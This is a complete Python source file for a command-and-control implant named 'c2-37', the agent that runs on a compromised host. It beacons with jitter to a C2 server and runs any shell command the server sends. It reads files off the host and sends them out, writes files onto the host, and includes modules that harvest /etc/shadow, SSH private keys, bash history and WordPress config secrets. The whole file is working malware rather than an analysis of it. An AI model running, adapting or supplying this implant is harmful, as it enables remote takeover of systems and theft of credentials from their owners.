"""c2-37 implant — the agent that runs on target.

Beacons back to the C2 server, executes commands,
handles sleep + jitter. Designed to be small and portable.
"""
from __future__ import annotations

import base64
import json
import os
import platform
import random
import socket
import subprocess
import time
import urllib.request
import uuid


class Implant:
    """C2 agent that beacons to the mothership."""

    def __init__(self, server_url: str, agent_id: str = None):
        self.server = server_url.rstrip("/")
        self.id = agent_id or str(uuid.uuid4())[:8]
        self.sleep = 5
        self.jitter = 20  # percentage
        self.running = True

    def _post(self, path: str, data: dict) -> dict:
        """POST JSON to the C2 server."""
        body = json.dumps(data).encode()
        req = urllib.request.Request(
            f"{self.server}{path}",
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                return json.loads(resp.read())
        except Exception:
            return {}

    def _system_info(self) -> dict:
        """Gather basic system info for registration."""
        return {
            "id": self.id,
            "hostname": socket.gethostname(),
            "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
            "os": f"{platform.system()} {platform.release()}",
        }

    def register(self) -> bool:
        """Register with the C2 server."""
        resp = self._post("/register", self._system_info())
        if resp.get("status") == "ok":
            self.id = resp.get("id", self.id)
            self.sleep = resp.get("sleep", self.sleep)
            self.jitter = resp.get("jitter", self.jitter)
            return True
        return False

    def beacon(self) -> list[dict]:
        """Check in and get pending commands."""
        resp = self._post("/beacon", {"id": self.id})
        return resp.get("commands", [])

    def execute(self, cmd: dict) -> dict:
        """Execute a command and return the result."""
        cmd_type = cmd.get("type", "")
        args = cmd.get("args", {})
        result = {"cmd_id": cmd.get("id"), "id": self.id, "type": cmd_type}

        try:
            if cmd_type == "shell":
                proc = subprocess.run(
                    args.get("cmd", ""),
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=args.get("timeout", 30),
                )
                result["stdout"] = proc.stdout
                result["stderr"] = proc.stderr
                result["returncode"] = proc.returncode

            elif cmd_type == "download":
                # Read a file from target and send contents
                fpath = args.get("path", "")
                with open(fpath, "rb") as f:
                    result["data"] = base64.b64encode(f.read()).decode()
                result["path"] = fpath

            elif cmd_type == "upload":
                # Write data to a file on target
                fpath = args.get("path", "")
                data = base64.b64decode(args.get("data", ""))
                with open(fpath, "wb") as f:
                    f.write(data)
                result["path"] = fpath
                result["size"] = len(data)

            elif cmd_type == "sysinfo":
                result.update(self._system_info())
                result["pid"] = os.getpid()
                result["cwd"] = os.getcwd()

            elif cmd_type == "sleep":
                self.sleep = args.get("sleep", self.sleep)
                self.jitter = args.get("jitter", self.jitter)
                result["sleep"] = self.sleep
                result["jitter"] = self.jitter

            elif cmd_type == "module":
                # Execute a post-exploitation module
                result.update(self._run_module(args.get("name", "")))

            elif cmd_type == "exit":
                self.running = False
                result["status"] = "exiting"

            else:
                result["error"] = f"unknown command type: {cmd_type}"

        except Exception as e:
            result["error"] = str(e)

        return result

    def _run_module(self, name: str) -> dict:
        """Run a post-exploitation module inline."""
        try:
            from c2_37.modules import run_module
            return run_module(name)
        except ImportError:
            # Standalone mode — modules not available, run inline equivalents
            return self._builtin_module(name)

    def _builtin_module(self, name: str) -> dict:
        """Fallback modules for standalone implant (no intercept37 installed)."""
        if name == "enum_users":
            try:
                with open("/etc/passwd") as f:
                    users = []
                    for line in f:
                        parts = line.strip().split(":")
                        if len(parts) >= 7:
                            users.append({"name": parts[0], "uid": parts[2], "shell": parts[6]})
                return {"users": users}
            except Exception as e:
                return {"error": str(e)}

        elif name == "enum_network":
            result = {}
            for key, cmd in [("interfaces", "ip addr"), ("routes", "ip route"), ("connections", "ss -tlnp")]:
                try:
                    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    result[key] = proc.stdout
                except Exception:
                    pass
            return result

        elif name == "enum_suid":
            try:
                proc = subprocess.run(
                    "find / -perm -4000 -type f 2>/dev/null",
                    shell=True, capture_output=True, text=True, timeout=30
                )
                return {"suid": [f for f in proc.stdout.strip().split("\n") if f]}
            except Exception as e:
                return {"error": str(e)}

        elif name == "enum_creds":
            findings = []
            for path in ["/etc/shadow", "~/.ssh/id_rsa", "~/.bash_history", "/var/www/html/wp-config.php"]:
                path = os.path.expanduser(path)
                if os.path.exists(path):
                    try:
                        with open(path) as f:
                            findings.append({"file": path, "readable": True, "preview": f.read(500)})
                    except PermissionError:
                        findings.append({"file": path, "readable": False})
            return {"findings": findings}

        return {"error": f"unknown module: {name}"}

    def send_result(self, result: dict):
        """Send command result back to C2."""
        self._post("/result", result)

    def _jittered_sleep(self):
        """Sleep with jitter applied."""
        jitter_range = self.sleep * self.jitter / 100
        actual = self.sleep + random.uniform(-jitter_range, jitter_range)
        time.sleep(max(0.5, actual))

    def run(self):
        """Main agent loop — register, beacon, execute, repeat."""
        if not self.register():
            return

        while self.running:
            try:
                commands = self.beacon()
                for cmd in commands:
                    result = self.execute(cmd)
                    self.send_result(result)
            except Exception:
                pass
            self._jittered_sleep()


# ── Standalone execution ───────────────────────────────
if __name__ == "__main__":
    import sys
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8037"
    agent = Implant(url)
    agent.run()
